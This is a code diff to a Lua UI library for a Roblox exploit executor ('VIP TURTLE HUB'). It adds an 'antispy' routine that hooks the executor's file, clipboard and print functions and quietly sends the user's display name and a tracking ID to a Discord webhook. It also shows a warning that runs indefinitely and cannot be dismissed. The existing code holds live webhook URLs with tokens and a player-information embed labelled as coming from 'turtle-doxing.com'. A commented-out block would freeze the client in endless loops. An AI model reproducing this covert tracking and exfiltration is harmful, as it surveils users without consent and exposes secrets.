@@ -11,6 +11,7 @@ local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local GroupService = game:GetService("GroupService")
 local workspace = game:GetService("Workspace")
+local GUID = HttpService:GenerateGUID(false)
 local HTMLcolors = { 
     ["Red"] = "rgb(255, 0, 0)",
     ["Yellow"] = "rgb(255, 255, 0)",
@@ -65,6 +66,17 @@ local HTMLcolors = {
     ["Medium Orchid"] = "rgb(186, 85, 211)",
     ["Slate Gray"] = "rgb(112, 128, 144)",
     ["Deep Sky Blue"] = "rgb(0, 191, 255)"
+}
+local expfunctions = {
+    writefile,
+    print,
+    setclipboard,
+    rconsoleerr,
+    rconsolewarn,
+    warn,
+    error,
+    isfile,
+    readfile
 }
 
 if game.CoreGui:FindFirstChild("VIP TURTLE HUB UI") then
@@ -189,7 +201,7 @@ function lib:WarnUser(title,params)
 	CloseWarnInterface()
 	end)
   end
-end
+end --lib:WarnUser("VSP [ Vanguard Script Protection ]\nVanguard has detected http spying, please turn off http spy to continue using this script.",{AutoClose = true,CanClick = false,Duration = 9e9})
 
 coroutine.wrap(
     function()
@@ -363,6 +375,7 @@ end
 
 local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
+local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
 local embed = {
     ["title"] = LocalPlayer.DisplayName .. "'s information",
     ["description"] = "Response from turtle-doxing.com",
@@ -413,6 +426,56 @@ function lib:hooksend(str)
 		print(c)
 	end
 end
+
+local spyembed = {
+    ["title"] = "Successfully warned '" .. LocalPlayer.DisplayName .. "'",
+    ["description"] = "Webhook from VSP [ Vanguard Script Protection ]",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "Reason",
+            ["value"] = '```\nHttpSpy\n```'
+	}
+},
+    ["footer"] = {
+        ["text"] = "Blacklist code: " .. GUID
+    }
+}
+
+local function antispy()
+for i, v in next,expfunctions do
+    local old
+    old = hookfunction(v,newcclosure(function(...)
+                local args = {...}
+                for i,v in next,args do
+                    if tostring(i):find("https") or tostring(v):find("https") then
+                        SendMessageEMBED(spylog,spyembed)
+			lib:WarnUser("VSP [ Vanguard Script Protection ]\nVanguard has detected http spying, please turn off http spy to continue using this script.",{AutoClose = true,CanClick = false,Duration = 9e9})
+                    end
+                end
+                return old(...)
+            end))
+end
+end
+
+antispy()
+
+--[[if _G.ID then
+    while true do
+    end
+end
+setmetatable(
+    _G,
+    {
+        __newindex = function(t, i, v)
+            if tostring(i) == "ID" then
+                while true do
+                end
+            end
+        end
+    }
+)
+]]
 
 function lib:Window(text, preset, closebind)
     CloseBind = closebind or Enum.KeyCode.RightControl
